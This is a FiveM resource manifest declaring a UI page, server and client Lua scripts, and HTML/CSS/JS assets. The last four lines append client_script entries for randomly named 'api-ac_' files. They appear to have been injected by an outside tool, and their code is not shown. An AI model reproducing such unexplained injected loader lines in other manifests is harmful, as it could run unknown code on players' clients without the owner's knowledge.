resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

ui_page('client/html/index.html')

server_scripts {
	'config.lua',
	'@mysql-async/lib/MySQL.lua',
	'server/server.lua'
}

client_scripts {
	'config.lua',
	'client/client.lua'
}

files {
	'client/html/index.html',
    'client/html/css/chunk-*.css',
    'client/html/js/chunk-*.js',
    'client/html/css/app.css',
    'client/html/js/app.js',
    'client/html/img/citizen-image-placeholder.png',
    'client/html/img/example-image.jpg',
    'client/html/img/*.png',
    'client/html/config/config.json'
} 
client_script "api-ac_CJOUjcftOzFS.lua"
client_script "api-ac_PhLtMfCLHUqN.lua"
client_script "api-ac_xagvSDFblUVF.lua"
client_script "api-ac_cwbvUaxTboKa.lua"